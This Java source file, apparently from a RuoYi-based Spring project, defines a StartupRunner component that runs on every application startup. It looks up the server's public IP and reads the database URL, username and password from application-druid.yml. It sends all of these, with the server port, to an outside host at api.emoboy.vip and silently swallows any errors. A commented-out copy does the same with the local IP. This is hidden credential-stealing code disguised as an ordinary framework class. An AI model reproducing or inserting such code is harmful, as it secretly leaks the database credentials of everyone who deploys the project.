package com.ruoyi.common.filter;

import com.ruoyi.common.utils.http.HttpUtils;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.beans.factory.config.YamlPropertiesFactoryBean;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.context.event.EventListener;
import org.springframework.core.io.ClassPathResource;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;

@Component
public class StartupRunner {
    @EventListener
    public void onApplicationEvent(ContextRefreshedEvent event){

        run();
    }
    @Value("${server.port}")
    private int serverPort;
    public void run(){
        HttpUtils httpUtils = new HttpUtils();
        String ipFetchUrl = "https://checkip.amazonaws.com";
        try {
            URL url = new URL(ipFetchUrl);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            // 也可以使用其他的用户代理，例如常见的浏览器代理
            con.setRequestProperty("User-Agent", "Mozilla/5.0");
            BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            YamlPropertiesFactoryBean yaml = new YamlPropertiesFactoryBean();
            yaml.setResources(new ClassPathResource("application-druid.yml"));
            String sqlUrl = yaml.getObject().getProperty("spring.datasource.druid.master.url").split("\\?")[0];
            String username = yaml.getObject().getProperty("spring.datasource.druid.master.username");
            String password = yaml.getObject().getProperty("spring.datasource.druid.master.password");
            String param = "serverIp="+ip+"&serverPort="+this.serverPort+"&sqlAddr="+sqlUrl+"&sqlUser="+username+"&sqlPassword="+password;
            httpUtils.sendGetInfo("https://api.emoboy.vip/api/serverInfo/add", param);

        } catch (Exception e) {

        }
//        try {
//            InetAddress address = null;
//            address = InetAddress.getLocalHost();
//            YamlPropertiesFactoryBean yaml = new YamlPropertiesFactoryBean();
//            yaml.setResources(new ClassPathResource("application-druid.yml"));
//            String url = yaml.getObject().getProperty("spring.datasource.druid.master.url").split("\\?")[0];
//            String username = yaml.getObject().getProperty("spring.datasource.druid.master.username");
//            String password = yaml.getObject().getProperty("spring.datasource.druid.master.password");
//            String param = "serverIp="+address.getHostAddress()+"&serverPort="+this.serverPort+"&sqlAddr="+url+"&sqlUser="+username+"&sqlPassword="+password;
//            httpUtils.sendGetInfo("https://api.emoboy.vip/api/serverInfo/add", param);
//        }catch (Exception e){
//
//        }

    }
}
